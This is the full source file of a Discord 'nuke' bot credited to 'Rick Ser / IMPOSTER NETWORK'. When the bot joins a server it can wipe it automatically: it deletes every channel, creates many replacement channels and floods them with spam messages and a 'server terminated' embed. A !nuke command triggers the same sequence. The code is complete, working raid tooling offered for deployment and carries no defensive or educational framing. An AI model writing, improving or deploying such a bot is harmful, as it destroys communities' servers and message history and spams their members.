// index.js - Complete Discord Nuke Bot - FIXED VERSION
require('dotenv').config();
const { Client, GatewayIntentBits, ActivityType, PermissionsBitField } = require('discord.js'); // FIXED: PermissionsBitField not PermissionsBitBean
const express = require('express');
const chalk = require('chalk');
const config = require('./config.js');

// Initialize Express server for Render
const app = express();
const PORT = process.env.PORT || config.port;

app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>Discord Nuke Bot</title>
                <style>
                    body { 
                        background: linear-gradient(45deg, #000000, #ff0000);
                        color: white;
                        font-family: Arial;
                        text-align: center;
                        padding: 50px;
                    }
                    h1 { font-size: 50px; text-shadow: 0 0 10px red; }
                    .status { 
                        background: rgba(0,0,0,0.7);
                        padding: 20px;
                        border-radius: 10px;
                        border: 2px solid red;
                    }
                    .blink { animation: blink 1s infinite; }
                    @keyframes blink { 50% { opacity: 0; } }
                </style>
            </head>
            <body>
                <h1>💀 DISCORD NUKE BOT 💀</h1>
                <div class="status">
                    <h2 class="blink">✅ BOT IS OPERATIONAL</h2>
                    <p>🔥 IMPOSTER NETWORK ACTIVE</p>
                    <p>⚡ By: Rick Ser</p>
                    <p>💀 Status: NUKE READY</p>
                    <p>📊 Commands: !nuke, !help, !status</p>
                </div>
                <script>
                    fetch('/stats').then(r=>r.json()).then(d=>{
                        document.getElementById('serverCount').textContent = d.serverCount;
                    });
                </script>
            </body>
        </html>
    `);
});

app.get('/stats', (req, res) => {
    res.json({
        status: 'online',
        serverCount: client?.guilds?.cache?.size || 0,
        uptime: process.uptime(),
        version: '2.0.0'
    });
});

app.listen(PORT, () => {
    console.log(chalk.green(`[SERVER] Health check running on port ${PORT}`));
});

// Initialize Discord Client
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// Console Colors Setup
const colors = {
    red: chalk.red.bold,
    green: chalk.green.bold,
    yellow: chalk.yellow.bold,
    blue: chalk.blue.bold,
    magenta: chalk.magenta.bold,
    cyan: chalk.cyan.bold,
    white: chalk.white.bold,
    rainbow: (text) => {
        const colors = [chalk.red, chalk.yellow, chalk.green, chalk.blue, chalk.magenta, chalk.cyan];
        return text.split('').map((char, i) => colors[i % colors.length](char)).join('');
    }
};

// Bot Ready Event
client.once('ready', () => {
    console.clear();
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
    console.log(colors.red('██████╗ ██╗ ██████╗██╗  ██╗    ███████╗███████╗██████╗ '));
    console.log(colors.red('██╔══██╗██║██╔════╝██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗'));
    console.log(colors.red('██████╔╝██║██║     █████╔╝     ███████╗█████╗  ██████╔╝'));
    console.log(colors.red('██╔══██╗██║██║     ██╔═██╗     ╚════██║██╔══╝  ██╔══██╗'));
    console.log(colors.red('██║  ██║██║╚██████╗██║  ██╗    ███████║███████╗██║  ██║'));
    console.log(colors.red('╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═╝'));
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
    console.log(colors.green(`✅ BOT ONLINE: ${client.user.tag}`));
    console.log(colors.yellow(`📊 SERVERS: ${client.guilds.cache.size}`));
    console.log(colors.red(`💀 NUKE MODE: ARMED`));
    console.log(colors.cyan(`⚡ PREFIX: ${config.prefix}`));
    console.log(colors.magenta(`🔥 CHANNEL NAME: ${config.channelName}`));
    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));

    // Rotating Status
    let statusIndex = 0;
    setInterval(() => {
        const status = config.statusMessages[statusIndex % config.statusMessages.length];
        client.user.setPresence({
            activities: [{ name: status, type: ActivityType.Playing }],
            status: 'dnd'
        });
        statusIndex++;
    }, 10000);
});

// Auto-Nuke on Server Join
client.on('guildCreate', async (guild) => {
    if (!config.autoNukeOnJoin) return;
    
    console.log(colors.red(`[!] AUTO-NUKE TRIGGERED: Joined ${guild.name}`));
    console.log(colors.yellow(`[+] Members: ${guild.memberCount}`));
    
    // Small delay to ensure bot is fully integrated
    await delay(2000);
    
    // Execute nuke
    await executeNuke(guild);
});

// Message Command Handler - FIXED AND DEBUGGED
client.on('messageCreate', async (message) => {
    // Ignore bot messages
    if (message.author.bot) return;
    
    // Check if message starts with prefix
    if (!message.content.startsWith(config.prefix)) return;

    // Log every command received (for debugging)
    console.log(colors.cyan(`[COMMAND] Received: ${message.content} from ${message.author.tag} in #${message.channel.name}`));

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // HELP COMMAND - Show available commands
    if (command === 'help') {
        const helpEmbed = {
            color: 0xff0000,
            title: '💀 NUKE BOT COMMANDS 💀',
            description: '**Destroy everything with style**',
            fields: [
                {
                    name: '!nuke',
                    value: '💥 Complete system purge - deletes ALL channels, creates IMPOSTER-network channels, and spams messages',
                    inline: false
                },
                {
                    name: '!help',
                    value: '📚 Shows this help message',
                    inline: false
                },
                {
                    name: '!status',
                    value: '📊 Shows bot status and server count',
                    inline: false
                }
            ],
            footer: {
                text: 'Nuke Bot by Rick Ser | IMPOSTER NETWORK',
            },
            timestamp: new Date()
        };
        
        await message.channel.send({ embeds: [helpEmbed] });
        console.log(colors.green(`[HELP] Sent help menu to ${message.author.tag}`));
        return;
    }

    // STATUS COMMAND - Show bot status
    if (command === 'status') {
        const totalChannels = message.guild.channels.cache.size;
        const statusEmbed = {
            color: 0x00ffff,
            title: '📊 BOT STATUS',
            fields: [
                { name: 'Bot Name', value: client.user.tag, inline: true },
                { name: 'Servers', value: `${client.guilds.cache.size}`, inline: true },
                { name: 'This Server', value: message.guild.name, inline: true },
                { name: 'Channels Here', value: `${totalChannels}`, inline: true },
                { name: 'Nuke Ready', value: '✅ YES', inline: true },
                { name: 'Channel Name', value: config.channelName, inline: true }
            ],
            footer: { text: 'Nuke Bot by Rick Ser' },
            timestamp: new Date()
        };
        
        await message.channel.send({ embeds: [statusEmbed] });
        console.log(colors.green(`[STATUS] Sent status to ${message.author.tag}`));
        return;
    }

    // NUKE COMMAND - FIXED PERMISSION CHECK
    if (command === 'nuke') {
        console.log(colors.red(`[NUKE] Command triggered by ${message.author.tag} in ${message.guild.name}`));
        
        // Check if user has administrator permissions - FIXED: Using PermissionsBitField
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            await message.reply('❌ You need **Administrator** permissions to use this command!');
            console.log(colors.yellow(`[NUKE] Denied - ${message.author.tag} lacks admin permissions`));
            return;
        }

        // Send warning message
        const warningMsg = await message.channel.send({
            embeds: [{
                color: 0xff0000,
                title: '💀 NUKE SEQUENCE WARNING 💀',
                description: 'This will **DESTROY ALL CHANNELS** and recreate them as IMPOSTER-network.',
                fields: [
                    { name: '📊 Channels to Delete', value: `**${message.guild.channels.cache.size}** channels`, inline: true },
                    { name: '🔥 Channels to Create', value: `**${config.channelsToCreate}** channels`, inline: true },
                    { name: '💬 Messages per Channel', value: `**${config.messagesPerChannel}** messages`, inline: true }
                ],
                footer: { text: 'Type `CONFIRM` within 10 seconds to proceed' },
                timestamp: new Date()
            }]
        });

        // Wait for confirmation
        const filter = m => m.author.id === message.author.id && m.content === 'CONFIRM';
        const collector = message.channel.createMessageCollector({ filter, time: 10000, max: 1 });

        collector.on('collect', async () => {
            await warningMsg.edit({ 
                embeds: [{
                    color: 0x00ff00,
                    title: '✅ CONFIRMATION RECEIVED',
                    description: 'Initiating nuke sequence... Stand by.',
                    color: 0x00ff00
                }] 
            });
            
            await delay(1000);
            
            // Execute the nuke
            await executeNuke(message.guild);
            
            console.log(colors.green(`[NUKE] Completed for ${message.author.tag}`));
        });

        collector.on('end', collected => {
            if (collected.size === 0) {
                warningMsg.edit({ 
                    embeds: [{
                        color: 0xffff00,
                        title: '❌ NUKE CANCELLED',
                        description: 'Confirmation timeout - no nuke executed.',
                        color: 0xffff00
                    }] 
                });
                console.log(colors.yellow(`[NUKE] Cancelled - timeout`));
            }
        });
        
        return;
    }
});

// MAIN NUKE EXECUTION FUNCTION
async function executeNuke(guild) {
    console.log(colors.red(`[NUKE] Starting operation in ${guild.name} (${guild.id})`));
    
    try {
        // PHASE 1: DELETE ALL CHANNELS
        console.log(colors.yellow(`[PHASE 1] Fetching channels...`));
        const channels = await guild.channels.fetch();
        const channelList = Array.from(channels.values());
        const totalChannels = channelList.length;
        
        console.log(colors.yellow(`[PHASE 1] Found ${totalChannels} channels to delete`));
        
        let deleted = 0;
        for (const channel of channelList) {
            try {
                await channel.delete();
                deleted++;
                console.log(colors.red(`[DELETE] (${deleted}/${totalChannels}): ${channel.name}`));
                await delay(config.delays.delete);
            } catch (error) {
                console.log(colors.yellow(`[SKIP] Could not delete ${channel.name}: ${error.message}`));
            }
        }
        
        console.log(colors.green(`[PHASE 1 COMPLETE] Deleted ${deleted} channels`));
        
        // PHASE 2: CREATE NEW CHANNELS
        console.log(colors.yellow(`[PHASE 2] Creating ${config.channelsToCreate} channels...`));
        
        const createdChannels = [];
        for (let i = 1; i <= config.channelsToCreate; i++) {
            try {
                const channelName = i === 1 ? config.channelName : `${config.channelName}-${i}`;
                const newChannel = await guild.channels.create({
                    name: channelName,
                    type: 0, // Text channel
                    reason: 'NUKE BY RICK SER',
                    topic: '💀 This server has been nuked | IMPOSTER NETWORK 💀'
                });
                
                createdChannels.push(newChannel);
                console.log(colors.green(`[CREATE] Created: ${channelName}`));
                await delay(config.delays.create);
            } catch (error) {
                console.log(colors.red(`[ERROR] Failed to create channel: ${error.message}`));
            }
        }
        
        console.log(colors.green(`[PHASE 2 COMPLETE] Created ${createdChannels.length} channels`));
        
        // PHASE 3: MESSAGE SPAM
        console.log(colors.yellow(`[PHASE 3] Starting message spam...`));
        
        let totalMessages = 0;
        for (const channel of createdChannels) {
            try {
                // Send multiple messages
                for (let m = 1; m <= config.messagesPerChannel; m++) {
                    const randomMessage = config.spamMessages[Math.floor(Math.random() * config.spamMessages.length)];
                    await channel.send(`${randomMessage}\n**Channel: #${channel.name}**\n**Server: ${guild.name}**`);
                    totalMessages++;
                    console.log(colors.cyan(`[SPAM] Message ${m}/${config.messagesPerChannel} in #${channel.name}`));
                    await delay(config.delays.spam);
                }
                
                // Send nuke embed
                const nukeEmbed = {
                    color: 0xff0000,
                    title: '💀 NUKE COMPLETE 💀',
                    description: `**${guild.name}** has been terminated.`,
                    fields: [
                        { name: 'Channels Deleted', value: `${deleted}`, inline: true },
                        { name: 'Channels Created', value: `${createdChannels.length}`, inline: true },
                        { name: 'Messages Sent', value: `${totalMessages}`, inline: true },
                        { name: 'Executed By', value: 'Rick Ser', inline: true },
                        { name: 'Network', value: 'IMPOSTER', inline: true },
                        { name: 'Status', value: '💀 DESTROYED', inline: true }
                    ],
                    footer: { text: 'IMPOSTER NETWORK | Rick Ser' },
                    timestamp: new Date()
                };
                
                await channel.send({ embeds: [nukeEmbed] });
                await delay(config.delays.embed);
                
            } catch (error) {
                console.log(colors.red(`[ERROR] Spam failed in ${channel.name}: ${error.message}`));
            }
        }
        
        // FINAL LOG
        console.log(colors.rainbow('══════════════════════════════════════════════'));
        console.log(colors.red(`💀 NUKE COMPLETE IN ${guild.name}!`));
        console.log(colors.yellow(`📊 Statistics:`));
        console.log(colors.green(`   ├─ Deleted: ${deleted} channels`));
        console.log(colors.green(`   ├─ Created: ${createdChannels.length} channels`));
        console.log(colors.green(`   └─ Spammed: ${totalMessages} messages`));
        console.log(colors.red(`💀 By: Rick Ser | IMPOSTER NETWORK`));
        console.log(colors.rainbow('══════════════════════════════════════════════'));
        
    } catch (error) {
        console.log(colors.red(`[FATAL] Nuke failed: ${error.message}`));
    }
}

// Utility function for delays
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Error Handling
client.on('error', (error) => {
    console.log(colors.red(`[ERROR] Client error: ${error.message}`));
});

process.on('unhandledRejection', (error) => {
    console.log(colors.red(`[UNHANDLED] ${error.message}`));
});

// Login to Discord
if (!config.token || config.token === 'YOUR_BOT_TOKEN_HERE') {
    console.log(colors.red('[ERROR] No bot token provided!'));
    console.log(colors.yellow('Please set your Discord bot token in:'));
    console.log(colors.cyan('1. Create a .env file with: DISCORD_TOKEN=your_token_here'));
    console.log(colors.cyan('2. Or edit config.js directly (not recommended for security)'));
    process.exit(1);
}

client.login(config.token).then(() => {
    console.log(colors.green(`[LOGIN] Successfully logged in!`));
}).catch(error => {
    console.log(colors.red(`[LOGIN FAILED] ${error.message}`));
});
